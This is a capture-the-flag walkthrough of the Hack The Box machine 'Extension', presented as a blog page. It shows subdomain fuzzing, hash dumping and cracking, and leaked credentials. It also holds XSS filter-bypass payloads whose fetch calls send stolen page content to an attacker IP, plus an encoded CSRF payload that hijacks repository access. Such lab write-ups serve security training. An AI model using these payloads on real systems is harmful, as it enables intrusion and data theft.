@@ -1,0 +1,410 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Extension [Hard] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Extension [Hard]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.10.11.171 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: nginx/1."/>
+
+    <meta property="og:title" content="HTB - Extension [Hard]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.10.11.171 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: nginx/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/extension/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-07-17T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-17T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Extension [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 17, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.10.11.171 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Directory listing for /
+</code></pre><ul>
+<li>domain: <code>extension.htb</code></li>
+</ul>
+<h1 id="web-enul">Web Enul</h1>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://extension.htb/&#34; -H &#34;Host: FUZZ.extension.htb&#34;
+[x]
+&gt; dirsearch -u http://extension.htb/ -x 404,301
+[19:21:26] 405 -  825B  - /_ignition/execute-solution                       
+[19:24:05] 302 -  350B  - /dashboard  -&gt;  http://extension.htb/login        
+[19:24:30] 200 -    0B  - /favicon.ico                                      
+[19:24:53] 403 -  278B  - /images/                                          
+[19:24:57] 200 -  957B  - /index.html                                       
+[19:24:58] 200 -   37KB - /index.php                                        
+[19:25:11] 403 -  278B  - /js/                                              
+[19:25:25] 200 -   37KB - /login                                            
+[19:25:29] 405 -  825B  - /logout                                           
+[19:25:53] 302 -  350B  - /new  -&gt;  http://extension.htb/login              
+[19:26:36] 200 -   37KB - /register                                         
+[19:26:47] 403 -  278B  - /server-status/                                   
+[19:26:47] 403 -  278B  - /server-status
+[19:27:35] 302 -  350B  - /users  -&gt;  http://extension.htb/login            
+[19:27:52] 200 -    1KB - /web.config
+</code></pre><ul>
+<li>Found <a href="http://extension.htb/login">http://extension.htb/login</a>, which then redirects to <a href="http://snippet.htb/">http://snippet.htb/</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://snippet.htb/&#34; -H &#34;Host: FUZZ.snippet.htb&#34; --hl 30
+000000019:   200        249 L    1197 W     12729 Ch    &#34;dev&#34;
+000000002:   200        96 L     331 W      5311 Ch     &#34;mail&#34;
+</code></pre><h1 id="httpdevsnippethtb"><a href="http://dev.snippet.htb/">http://dev.snippet.htb/</a></h1>
+<ul>
+<li>register an account</li>
+<li>found users on <a href="http://dev.snippet.htb/explore/users">http://dev.snippet.htb/explore/users</a></li>
+</ul>
+<pre tabindex="0"><code>administrator@snippet.htb
+charlie@snippet.htb
+jean@snippet.htb
+</code></pre><ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://dev.snippet.htb/ -x 404,301
+[19:34:55] 200 -    1KB - /.well-known/openid-configuration                 
+[19:35:00] 302 -   34B  - /admin  -&gt;  /user/login                           
+[19:35:07] 200 -   13KB - /administrator                                    
+[19:35:09] 200 -  818B  - /api/swagger                                      
+[19:35:22] 302 -   37B  - /explore  -&gt;  /explore/repos                      
+[19:35:23] 200 -   12KB - /explore/repos                                    
+[19:35:29] 302 -   34B  - /issues  -&gt;  /user/login 
+</code></pre><ul>
+<li><a href="http://dev.snippet.htb/login/oauth/keys">http://dev.snippet.htb/login/oauth/keys</a>, not useful for this machine</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;keys&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;use&#34;</span>: <span style="color:#e6db74">&#34;sig&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;JJ2IfFyQXk449QE8dIKuE1arjjNZlarw_iFYMYZWcOk&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;q8Xz7LZTnRhYxchpw5Q33OW8afJDNGZ16pnsUUbUJuY8LyBg-TJj0mm2GCB77lU8iDKU-rIVkDc8nXgx0tpKtOV2FiyPkmAQTLORMDVqwiLgs12ar9LabPjyI1uDdyLGtuVB9mAu-AoIcbvIPffCw_j96D0e5Rw5Z9kStVH82Q9_0xcaNJ5DPkBBg1R02d9K7aNiFX9QqkHp_HIVMhAEdehn42Vmi7vk3EKBJTH8LUObHeykh1j9a1ckZ2dbfPXrvRhPZr6EuxKKCL3p-8ih32xr42GTZKaDLCe4t1XB6htPEzFATgaYyZSbey8lriHErbioIpaghlFKYtldktPBRD636_GVqKXKdPLyP3wszIieSdJAQSRbuqqNK-llyBVzZoWOrhk_rIpCFMnL70BBZLtJHVqRCsRNdsojpNRX8kLlENEvU6orc4yXhzQkhMpwwwVnyDJB_NPSjIhrMJ-wtVLeno42peuu7KZcQVjoiCwuJcsjmxQADhcCXFl5-1x65F8BpzrGCwG5OBlms6IHFVZG-9IjR8zPGwdumtvFhqGU5f5R8SffFe6zLqUaecAVZTsDKmFg5G6AIwV4O3pduoCPmKmL9UAhCBkqV7V9aePH8SBVfw46EpyEFwkgcf-KSjFFxD1VFEbZY636Jws7cXOkdba9ifgBglXDOnBj67E&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="initial-login-to-the-snippet-portal">initial login to the snippet portal</h1>
+<ul>
+<li>Enum on the client app identifies an endpoint at <a href="http://snippet.htb/management/dump">http://snippet.htb/management/dump</a> that&rsquo;s available via post.</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://snippet.htb/ | grep management
+</code></pre><ul>
+<li>Later, we&rsquo;ll see that this endpoint can be used to dump user hash</li>
+<li>The post body requires a key and a value pair, these two can be fuzzed as below</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -d &#39;{&#34;FUZZ&#34;:&#34;value&#34;}&#39; -u http://snippet.htb/management/dump -w /usr/share/wordlists/wfuzz/general/big.txt -H &#34;Content-Type: application/json&#34; -H &#34;X-XSRF-TOKEN: x_xsrf_token&#34; -H &#34;Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id&#34; --hs &#34;Missing&#34;
+</code></pre><ul>
+<li>The final payload is {&ldquo;download&rdquo;:&ldquo;users&rdquo;} and using this you can dump the hashes of accounts on the system</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -d &#39;{&#34;download&#34;:&#34;users&#34;}&#39; http://snippet.htb/management/dump -H &#34;Content-Type: application/json&#34; -H &#34;X-XSRF-TOKEN: x_xsrf_token&#34; -H &#34;Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id&#34; &gt; users.json
+</code></pre><ul>
+<li>find accounts with manager type, but the hashes are not crackable</li>
+</ul>
+<pre tabindex="0"><code>charlie@snippet.htb
+30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82
+fern@snippet.htb
+f1a5bf0598c3c1a360ded1bb0a20a6c6751ea7f1168b7aa9cf66cade864b9218
+</code></pre><ul>
+<li>There are some hashes that are crackable using raw-sha256 format</li>
+</ul>
+<pre tabindex="0"><code>&gt; john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+gia@snippet.htb
+juliana@snippet.htb
+letha@snippet.htb
+fredrick@snippet.htb
+ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
+</code></pre><ul>
+<li>We can login to <a href="http://snippet.htb">http://snippet.htb</a> using any of the above accounts to continue the next step.</li>
+</ul>
+<h1 id="get-jeans-credential">get jean&rsquo;s credential</h1>
+<ul>
+<li>Browse the snippet feature and understand how the snippet is updated</li>
+<li>Try send is_public true to multiple snippet ids, until you see another user&rsquo;s snippet with a curl command in it</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H &#39;accept: application/json&#39; -H &#39;authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB&#39;
+</code></pre><ul>
+<li>This is jean&rsquo;s credential</li>
+</ul>
+<pre tabindex="0"><code>&gt; echo amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB | base64 -d
+`jean:EHmfar1Y7ppA9O5TAIXnYnJpA`
+&gt; curl -X &#39;GET&#39; &#39;http://dev.snippet.htb/api/v1/repos/charlie/backups/collaborators&#39; -H &#39;accept: application/json&#39; -H &#39;authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB&#39;
+</code></pre><h1 id="xss-attack-on-charlie">xss attack on charlie</h1>
+<ul>
+<li>login to <a href="http://dev.snippet.htb">http://dev.snippet.htb</a> using jean and browse the extension repo</li>
+<li>We learnt that there is a vulnerability in the inject.js chek function</li>
+<li>filters are case sensitive and str.replace is only replacing the first occurance of &lt;&gt; tag, so we can use two &lt;&gt; tags to bypass this.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// remove tags
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;.*?&gt;/</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filter</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;\&#39;&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, <span style="color:#e6db74">&#34;src&#34;</span>, <span style="color:#e6db74">&#34;script&#34;</span>, <span style="color:#e6db74">&#34;&amp;&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;[&#34;</span>, <span style="color:#e6db74">&#34;]&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">filter</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">i</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>We learnt that charlie is a collaborator of the repo and is perhaps reading the issues from time to time.</li>
+<li>So in principle, we can post an issue and expect charlie to read it, where we can achieve xss in charlie&rsquo;s context</li>
+<li>exploit vector, this reference is helpful: <a href="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md">https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>test&lt;<span style="color:#f92672">test</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://attacker-ip/test.jpg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>test&lt;<span style="color:#f92672">test</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">eval.call`${&#34;eval\x28atob`base64_payload`\x29&#34;}`</span>&gt;
+</span></span></code></pre></div><ul>
+<li>basic payload</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://dev.snippet.htb/target-url&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://attacker-ip/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">d</span>)))
+</span></span></code></pre></div><ul>
+<li>We can use api to change collaborator as jean, because we have the auth token</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -X &#39;PUT&#39; &#39;http://dev.snippet.htb/api/v1/repos/jean/extension/collaborators/charlie&#39; -H &#39;accept: application/json&#39; -H &#39;authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB&#39; -H &#39;Content-Type: application/json&#39;  -d &#39;{&#34;permission&#34;: &#34;pull&#34;}&#39;
+</code></pre><ul>
+<li>But we cannot use /api/v1 for charlie because we don&rsquo;t have the API auth token for charlie</li>
+<li>But we can use the UI to add jean to the repo, the poc needs to be tested using jean&rsquo;s extension repo first, then change it to operate on charlie&rsquo;s backups repo.</li>
+<li>following are some trail and errors</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.16.27/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">data</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// get
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://dev.snippet.htb/api/v1/repos/charlie/backups/collaborators&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.16.27/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">data</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://dev.snippet.htb/api/v1/users/charlie/repos/backups&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.16.27/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">data</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// put
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://dev.snippet.htb/api/v1/repos/charlie/backups/collaborators/jean&#39;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;PUT&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>, <span style="color:#e6db74">&#39;accept&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>},<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#e6db74">&#34;permission&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>})}).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.16.27/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">d</span>)))
+</span></span></code></pre></div><ul>
+<li>there seems to be a 500 char limit, so the strimmed payload is this</li>
+<li>request to the collaborators page to get the csrf token and then send a request to add jean to the repo</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://dev.snippet.htb/charlie/backups/settings/collaboration&#39;</span>;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">u</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;meta[name=&#34;_csrf&#34;]&#39;</span>).<span style="color:#a6e22e">content</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">t</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">u</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/x-www-form-urlencoded;&#39;</span>}, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;collaborator=jean&amp;_csrf=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">t</span>}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.16.27/?done&#39;</span>)))
+</span></span></code></pre></div><ul>
+<li>the final payload after base64 encoding</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>test&lt;<span style="color:#f92672">test</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">eval.call`${&#34;eval\x28atob`dmFyIHU9J2h0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NldHRpbmdzL2NvbGxhYm9yYXRpb24nO2ZldGNoKHUpLnRoZW4ociA9PiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdtZXRhW25hbWU9Il9jc3JmIl0nKS5jb250ZW50KS50aGVuKHQgPT4gZmV0Y2godSx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsnfSwgYm9keTonY29sbGFib3JhdG9yPWplYW4mX2NzcmY9Jyt0fSkudGhlbihkID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTYuMjcvP2RvbmUnKSkp`\x29&#34;}`</span>&gt;
+</span></span></code></pre></div><ul>
+<li>Now, since we have access to <a href="http://dev.snippet.htb/charlie/backups">http://dev.snippet.htb/charlie/backups</a>, we can donwload the backup.tar.gz and find charlie&rsquo;s ssh id_rsa.</li>
+<li>login as charlie and switch to jean to obtain the user flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; su jean
+`EHmfar1Y7ppA9O5TAIXnYnJpA`
+</code></pre><h1 id="httpmailsnippethtb"><a href="http://mail.snippet.htb/">http://mail.snippet.htb/</a></h1>
+<ul>
+<li>nothing found</li>
+</ul>
+<h1 id="root">root</h1>
+<ul>
+<li>Upload linpeas and perform local enum</li>
+</ul>
+<pre tabindex="0"><code>[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:35387         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:44939         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::9000                 :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+Writable: /home/jean/projects/laravel-app/storage/logs/laravel.log 
+
+[+] Backup folders
+drwx------ 2 root root 4096 Jun 29 09:44 /etc/lvm/backup
+</code></pre><h1 id="promote-giasnippethtb">promote <a href="mailto:gia@snippet.htb">gia@snippet.htb</a></h1>
+<ul>
+<li>We have compromised <a href="mailto:gia@snippet.htb">gia@snippet.htb</a> before, there is a way to promote the user&rsquo;s privilege</li>
+<li>Run pspy64 found there is a backgroup process that logs in to mysql, the password can be captured.</li>
+</ul>
+<pre tabindex="0"><code>2022/07/27 02:40:01 CMD: UID=0    PID=92998  | sh -c mysql -u root -ptoor --database webapp --execute &#34;UPDATE users set password=&#39;30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82&#39; where email=&#39;charlie@snippet.htb&#39;;&#34;
+2022/07/27 02:40:01 CMD: UID=0    PID=93004  | mysql -u root -ptoor --database webapp --execute UPDATE users set password=&#39;30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82&#39; where email=&#39;charlie@snippet.htb&#39;;
+2022/07/27 02:40:01 CMD: UID=0    PID=93005  | docker ps -qf name=laravel-app_db
+</code></pre><ul>
+<li>The target doesn&rsquo;t have mysql client, so map our kali&rsquo;s local 13306 to target&rsquo;s localhost:3306</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh -L 13306:localhost:3306 charlie@10.10.11.171 -i home/charlie/.ssh/id_rsa
+&gt; mysql -h localhost -P 13306 -u root -ptoor --database webapp
+</code></pre><ul>
+<li>Locate <a href="mailto:gia@snippet.htb">gia@snippet.htb</a> and change the user type to Manager</li>
+</ul>
